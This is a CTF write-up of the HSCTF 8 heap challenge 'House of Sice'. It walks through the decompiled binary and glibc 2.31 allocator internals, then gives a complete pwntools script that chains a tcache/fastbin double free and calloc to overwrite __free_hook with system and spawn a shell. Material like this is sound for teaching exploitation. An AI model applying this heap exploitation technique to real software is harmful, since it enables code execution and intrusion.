---
title: 'HSCTF 8 2021: House of Sice (Pwn)'
layout: post
date: '2021-06-20'
tags:
- CTF
- writeup
- HSCTF 8
- Pwn
comments: true
---

> Welcome to the House of Sice! We hope you enjoy your stay.
>
> [libc-2.31.so](/files/libc-2.31.so)
>
> [house_of_sice](/files/house_of_sice)
>
> Author - poortho

In this challenge, we are provided with the challenge binary and libc. To start off, let's run checksec on it.

```
❯ checksec house_of_sice
[*] '/CTF/hsctf-2021/house-of-sice/house_of_sice'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Most security features are enabled, looks challenging. Let's run the binary to get a better idea of what the challenge is about.

```
❯ ./house_of_sice
Welcome to the House of Sice!
We offer the finest deets in the world at an affordable price!
Thanks to our money-back guaranteed policy, you can even sell your deets here!
As per tradition, we shall sice you a complimentary deet: 0x7f2174e9f080
1. Purchase a deet
2. Sell a deet
3. Exit
> 1
What kind of deet do you want?
1. Delightful Deet
2. Devious Deet
3. Flag
> 3
Sorry, we're sold out!
1. Purchase a deet
2. Sell a deet
3. Exit
> 1
What kind of deet do you want?
1. Delightful Deet
2. Devious Deet
3. Flag
> 1
Here's your deet!
As always, we follow a pay-what-you-want policy.
How much are you willing to pay for this?
> 24
Done!
1. Purchase a deet
2. Sell a deet
3. Exit
> 2
Which deet do you want to sell?
> 0
Done!
1. Purchase a deet
2. Sell a deet
3. Exit
> 3
Come back soon!
```

The program flow resembles a typical heap menu challenge. We can `Purchase a deet`, `Sell a deet`, and (as expected) straight up selecting the `Flag` option was not fruitful. What caught our attention in particular was that the program provided us with a _complimentary deet_ at the start which resembled a libc address. Let's perform some static analysis to gain a little more insight.

```c
puts("Welcome to the House of Sice!");
puts("We offer the finest deets in the world at an affordable price!");
puts("Thanks to our money-back guaranteed policy, you can even sell your deets here!");
printf("As per tradition, we shall sice you a complimentary deet: %p\n",system);
```

Based on the code above, it seems like the _complimentary deet_ was the `system` libc address. Well that would most certaintly be useful.

```c
void purchase_deet(void)
{
  int current_num_deets;
  ulong choice;
  void *_new_deet_ptr;
  void *new_deet_ptr;
  long in_FS_OFFSET;
  char buf [24];
  long canary;

  canary = *(in_FS_OFFSET + 0x28);
  current_num_deets = get_num_deets();
  puts("What kind of deet do you want?");
  puts("1. Delightful Deet");
  puts("2. Devious Deet");
  puts("3. Flag");
  printf("> ");
  read(0,buf,20);
  choice = strtoul(buf,0,10);
  if (choice == 2) {
    if (bought_devious == 0) {
      new_deet_ptr = calloc(8,1);
      deets[current_num_deets] = new_deet_ptr;
      bought_devious = 1;
    }
    else {
      puts("Out of stock!");
    }
  }
  else {
    if (choice == 3) {
      puts("Sorry, we\'re sold out!");
      goto LAB_00100bfc;
    }
    if (choice != 1) goto LAB_00100bfc;
    _new_deet_ptr = malloc(8);
    deets[current_num_deets] = _new_deet_ptr;
  }
  puts("Here\'s your deet!");
  puts("As always, we follow a pay-what-you-want policy.");
  puts("How much are you willing to pay for this?");
  printf("> ");
  read(0,buf,20);
  choice = strtoul(buf,0,10);
  *deets[current_num_deets] = choice;
  puts("Done!");
LAB_00100bfc:
  if (canary == *(in_FS_OFFSET + 0x28)) {
    return;
  }
  __stack_chk_fail();
}
```

In summary, the `purchase_deet` function (as seen above) does the following:

**Option 1 (Delightful Deet)** would `malloc` a new entry in `deets[]` array, and allow us to write an `unsigned long` value into it.

**Option 2 (Devious Deet)** would `calloc` a new entry in `deets[]` array, and allow us to write an `unsigned long` value into it. Note that we can only exercise this option once due to `bought_devious` being set to `1` after selecting this option for the first time.

**Option 3 (Flag)** would just tell us that the flag is sold out.

Additionally, we should note that the current deet index i.e. `current_num_deets` is resolved by the `get_num_deets()` function.

```c
int get_num_deets(void)
{
  int index;

  index = 0;
  while( true ) {
    if (15 < index) {
      puts("Out of space!");
      exit(-1);
    }
    if (deets[index] == 0) break;
    index = index + 1;
  }
  return index;
}
```

The `get_num_deets` function simply iterates through `deets[]` until the first `NULL` entry, and returns the current index. We should also note that it calls exit when the index exceeds 15.

```c
void sell_deet(void)
{
  ulong index;
  long in_FS_OFFSET;
  char buf [24];
  long canary;

  canary = *(in_FS_OFFSET + 0x28);
  puts("Which deet do you want to sell?");
  printf("> ");
  read(0,buf,20);
  index = strtoul(buf,0,10);
  if (index < 16) {
    free(deets[index]);
    puts("Done!");
  }
  else {
    puts("Invalid index!");
  }
  if (canary != *(in_FS_OFFSET + 0x28)) {
    __stack_chk_fail();
  }
  return;
}
```

The `sell_deet` function allows us to provide an index of a deet to be freed. As long as the index we provide does not exceed 16, it will call `free(deets[index])`. We should also note that the `deets` entry being freed is not nulled out by this function. Therefore the `get_num_deets` function we looked at earlier would contrain us to strictly 16 allocations in total i.e. we can only buy 16 deets, freeing deets do not get us additional allocations.

So how should we approach this? Let's review some of our key observations we've made so far:

1. The address of `system` is provided to us.
2. This challenge binary has Full RELRO enabled, so we'd likely have to overwrite one of the hooks i.e. `__malloc_hook`, `__free_hook` etc... in lieu of the GOT being not an option.
3. We do not have control of the allocation size.
4. The libc provided to us is `libc-2.31`, therefore tcachebins are in play (especially given the allocation sizes). However, `libc-2.31` is a little more strict so we cannot double free a tcache chunk directly without bypassing the key check.
5. We are strictly limited to 16 allocations, which actually means that we have enough allocations to fill up the tcache (max 7 bins), so this brings fastbin into play too.
6. We are specifically provided a feature which allows us to allocate using `calloc` instead of `malloc`, and this can only be called once.

Logically speaking, we should investigate the difference in using `calloc` vs `malloc`, preferably in the context of tcachebins and fastbins.

```c
# snippet from glibc-2.31/source/malloc/malloc.c

  if (!SINGLE_THREAD_P)
    {
      if (mem == 0 && av != NULL)
	{
	  LIBC_PROBE (memory_calloc_retry, 1, sz);
	  av = arena_get_retry (av, sz);
	  mem = _int_malloc (av, sz);
	}

      if (av != NULL)
	__libc_lock_unlock (av->mutex);
    }
```

If we look at the above [snippet](https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3439) of code within `__libc_calloc`, we can see that it allocates memory using `_int_malloc` which doesn't allocate from the tcache.

```c
# snippet from glibc-2.31/source/malloc/malloc.c

void *
__libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;

  _Static_assert (PTRDIFF_MAX <= SIZE_MAX / 2,
                  "PTRDIFF_MAX is not more than half of SIZE_MAX");

  void *(*hook) (size_t, const void *)
    = atomic_forced_read (__malloc_hook);
  if (__builtin_expect (hook != NULL, 0))
    return (*hook)(bytes, RETURN_ADDRESS (0));
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  if (!checked_request2size (bytes, &tbytes))
    {
      __set_errno (ENOMEM);
      return NULL;
    }
  size_t tc_idx = csize2tidx (tbytes);

  MAYBE_INIT_TCACHE ();

  DIAG_PUSH_NEEDS_COMMENT;
  if (tc_idx < mp_.tcache_bins
      && tcache
      && tcache->counts[tc_idx] > 0)
    {
      return tcache_get (tc_idx);
    }
  DIAG_POP_NEEDS_COMMENT;
#endif

  if (SINGLE_THREAD_P)
    {
      victim = _int_malloc (&main_arena, bytes);
      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
	      &main_arena == arena_for_chunk (mem2chunk (victim)));
      return victim;
    }

  arena_get (ar_ptr, bytes);

  victim = _int_malloc (ar_ptr, bytes);
```

If we contrast `__libc_calloc` to the above [snippet](https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L3022) of code, `__libc_malloc` attempts to allocate from the tcache first and only calls `_int_malloc` if it fails to get an allocation. This clearly establishes the difference between `calloc` and `malloc` in the context of this challenge. In short, `calloc` does not attempt to allocate from the tcache.

Now let's consider the typical exploit path for such a challenge. Given that libc 2.31 performs the [key field check](https://elixir.bootlin.com/glibc/glibc-2.31/source/malloc/malloc.c#L2924) to prevent double frees of tcachebins coupled with the fact that we don't have a write-after-free, performing a tcache dup directly is more of a challenge. Nevertheless, this can easily be bypassed by filling up the tcachebin to the limit (7 chunks) so that we have access to fastbins, and consequently performing a fastbin dup.

Let's calculate how many allocations we'd need for this to happen:

**7 allocations** to fill up the tcachebin

**2 allocations** for fastbins

**7 allocations** to exhaust all the bins (freed into tcache earlier)

**2 allocations** to obtain our fake chunk in the fastbin free list.

**Total: 18 allocations**

Ok looks like we don't have enough allocations to make that happen. Even if we made use of the `calloc` given to us, we'd need to pull out one more chunk from the fastbin free list to reach our fake chunk. Oof. Let's pull out GDB and play around the with allocations and see if we can improve things.

```
pwndbg> vis

0x555555758290  0x0000000000000000 0x0000000000000021    ........!.......
0x5555557582a0  0x0000000000000000 0x0000555555758010    ..........uUUU.. <-- tcachebins[0x20][6/7]
0x5555557582b0  0x0000000000000000 0x0000000000000021    ........!.......
0x5555557582c0  0x00005555557582a0 0x0000555555758010    ..uUUU....uUUU.. <-- tcachebins[0x20][5/7]
0x5555557582d0  0x0000000000000000 0x0000000000000021    ........!.......
0x5555557582e0  0x00005555557582c0 0x0000555555758010    ..uUUU....uUUU.. <-- tcachebins[0x20][4/7]
0x5555557582f0  0x0000000000000000 0x0000000000000021    ........!.......
0x555555758300  0x00005555557582e0 0x0000555555758010    ..uUUU....uUUU.. <-- tcachebins[0x20][3/7]
0x555555758310  0x0000000000000000 0x0000000000000021    ........!.......
0x555555758320  0x0000555555758300 0x0000555555758010    ..uUUU....uUUU.. <-- tcachebins[0x20][2/7]
0x555555758330  0x0000000000000000 0x0000000000000021    ........!.......
0x555555758340  0x0000555555758320 0x0000555555758010     .uUUU....uUUU.. <-- tcachebins[0x20][1/7], fastbins[0x20][1]
0x555555758350  0x0000000000000000 0x0000000000000021    ........!.......
0x555555758360  0x00000000deadbeef 0x0000000000000000    ................
0x555555758370  0x0000000000000000 0x0000000000000021    ........!....... <-- fastbins[0x20][0]
0x555555758380  0x0000555555758340 0x0000555555758010    @.uUUU....uUUU.. <-- tcachebins[0x20][0/7]
0x555555758390  0x0000000000000000 0x0000000000020c71    ........q....... <-- Top chunk

pwndbg> bins

tcachebins
0x20 [  7]: 0x555555758380 —▸ 0x555555758340 —▸ 0x555555758320 —▸ 0x555555758300 —▸ 0x5555557582e0 —▸ 0x5555557582c0 —▸ 0x5555557582a0 ◂— 0x0

fastbins
0x20: 0x555555758370 —▸ 0x555555758340 ◂— 0x0
```

Well... what do u know? We've got an overlap between `tcachebins[0x20][0/7]` and `fastbins[0x20][0]`, both pointing to `0x555555758380` and `0x555555758370` respectively (note that fastbin pointers point at data-0x10). Therefore, both chunks share the `0x0000555555758340` metadata (next chunk pointer).

The following steps would yield the above heap configuration:

1. malloc 8 chunks
2. free 7 chunks (fills up 0x20 tcachebin)
3. free the remaining chunk (goes into 0x20 fastbin)
4. malloc 1 chunk (from the tcachebin)
5. free fastbin chunk again

How does this improve our situation? We're still short of allocations right? Yes... but actually no.

```
pwndbg> vis

0x555555758290  0x0000000000000000 0x0000000000000021    ........!.......
0x5555557582a0  0x0000000000000000 0x0000555555758010    ..........uUUU..
0x5555557582b0  0x0000000000000000 0x0000000000000021    ........!.......
0x5555557582c0  0x00005555557582a0 0x0000555555758010    ..uUUU....uUUU..
0x5555557582d0  0x0000000000000000 0x0000000000000021    ........!.......
0x5555557582e0  0x00005555557582c0 0x0000555555758010    ..uUUU....uUUU..
0x5555557582f0  0x0000000000000000 0x0000000000000021    ........!.......
0x555555758300  0x00005555557582e0 0x0000555555758010    ..uUUU....uUUU..
0x555555758310  0x0000000000000000 0x0000000000000021    ........!.......
0x555555758320  0x0000555555758300 0x0000555555758010    ..uUUU....uUUU..
0x555555758330  0x0000000000000000 0x0000000000000021    ........!.......
0x555555758340  0x0000555555758320 0x0000555555758010     .uUUU....uUUU.. <-- fastbins[0x20][0]
0x555555758350  0x0000000000000000 0x0000000000000021    ........!.......
0x555555758360  0x00000000deadbeef 0x0000000000000000    ................
0x555555758370  0x0000000000000000 0x0000000000000021    ........!.......
0x555555758380  0x0000155555328e48 0x0000000000000000    H.2UU........... <-- tcachebins[0x20][0/7]
0x555555758390  0x0000000000000000 0x0000000000020c71    ........q....... <-- Top chunk

pwndbg> bins

tcachebins
0x20 [  7]: 0x555555758380 —▸ 0x155555328e48 (__free_hook) ◂— 0x0

fastbins
0x20: 0x555555758340 ◂— 0x0
```

If we make use of `calloc` to allocate us the fastbin chunk overlapping `tcachebins[0x20][0/7]` and write `__free_hook` into it, we'd get the above heap configuration. Notice that we've effectively redirected the 0x20 tcachebin freelist to point to `__free_hook` by overwriting the next chunk pointer of `tcachebins[0x20][0/7]` using the fastbin overlap. Therefore, we can just `malloc` ourself 2 more chunks and get allocated a chunk overlapping the `__free_hook` entry. We can now write `system` into free hook, which pretty much sums up this challenge.

```python
from pwn import *


HOST = "house-of-sice.hsc.tf"
PORT = 1337

CHALLENGE = "./house_of_sice"
CHALLENGE_LIBC = "./libc-2.31.so"
DEBUG_LIBC = "./libc-2.31-debug.so"

CHOICE_PROMPT = b"> "
COMPLEMENTARY_MARKER = b"complimentary deet: "

TCACHE_MAX_BINS = 7
FASTBIN_INDEX = (TCACHE_MAX_BINS + 1) - 1  # We define it as such for clarity
PLACEHOLDER = 0xDEADBEEF

current_index = 0

elf = context.binary = ELF(CHALLENGE, checksec=False)


if args.REMOTE:
    io = remote(HOST, PORT)
    libc = ELF(CHALLENGE_LIBC, checksec=False)
else:
    io = elf.process(aslr=False)
    libc = ELF(DEBUG_LIBC, checksec=False)


def delightful(amount: int) -> int:
    global current_index

    io.sendlineafter(CHOICE_PROMPT, str(1))
    io.sendlineafter(CHOICE_PROMPT, str(1))
    io.sendlineafter(CHOICE_PROMPT, str(amount))

    current_index += 1

    return current_index - 1


def devious(amount: int):
    global current_index

    io.sendlineafter(CHOICE_PROMPT, str(1))
    io.sendlineafter(CHOICE_PROMPT, str(2))
    io.sendlineafter(CHOICE_PROMPT, str(amount))

    current_index += 1

    return current_index - 1


def flag():
    io.sendlineafter(CHOICE_PROMPT, str(1))
    io.sendlineafter(CHOICE_PROMPT, str(3))


def sell(index: int):
    io.sendlineafter(CHOICE_PROMPT, str(2))
    io.sendlineafter(CHOICE_PROMPT, str(index))


def _exit():
    io.sendlineafter(CHOICE_PROMPT, str(3))


def get_complementary_deet() -> int:
    io.recvuntil(COMPLEMENTARY_MARKER)
    return int(io.recvline(), 16)


with log.progress("Resolving libc base address"):
    libc_system = get_complementary_deet()
    libc.address = libc_system - libc.sym.system
    log.success(f"libc @ 0x{libc.address:08x}")

with log.progress("Creating 8 chunks") as p:
    p.status(f"0/8")
    for i in range(TCACHE_MAX_BINS + 1):
        delightful(PLACEHOLDER)
        p.status(f"{i + 1}/8")

with log.progress("Filling up Tcache") as p:
    p.status(f"0/7")
    for i in range(TCACHE_MAX_BINS):
        sell(i)
        p.status(f"{i + 1}/7")

with log.progress("Overlapping Tcache chunk with Fastbin chunk") as p:
    p.status("Freeing chunk into fastbin (chunk A)")
    sell(FASTBIN_INDEX)
    p.status("Removing chunk from Tcache")
    delightful(PLACEHOLDER)
    p.status("Double free chunk A to also be in Tcache list")
    sell(FASTBIN_INDEX)

with log.progress("Linking `__free_hook` into Tcache list"):
    devious(libc.sym.__free_hook)  # calloc bypasses allocation from Tcache

with log.progress("Writing `sh` string onto heap"):
    sh_string = delightful(u32("sh\x00\x00"))

with log.progress("Writing `system` into `__free_hook`"):
    delightful(libc.sym.system)

with log.progress("Spawning shell"):
    sell(sh_string)

io.interactive()
```

Running the above script yields us the following.

```
❯ python xpl.py REMOTE
[+] Opening connection to house-of-sice.hsc.tf on port 1337: Done
[+] Resolving libc base address: Done
[+] libc @ 0x7fc75feb6000
[+] Creating 8 chunks: Done
[+] Filling up Tcache: Done
[+] Overlapping Tcache chunk with Fastbin chunk: Done
[+] Linking `__free_hook` into Tcache list: Done
[+] Writing `sh` string onto heap: Done
[+] Writing `system` into `__free_hook`: Done
[+] Spawning shell: Done
[*] Switching to interactive mode
$ cat flag
flag{tfw_the_double_free_check_still_sucks}
```

Flag: `flag{tfw_the_double_free_check_still_sucks}`
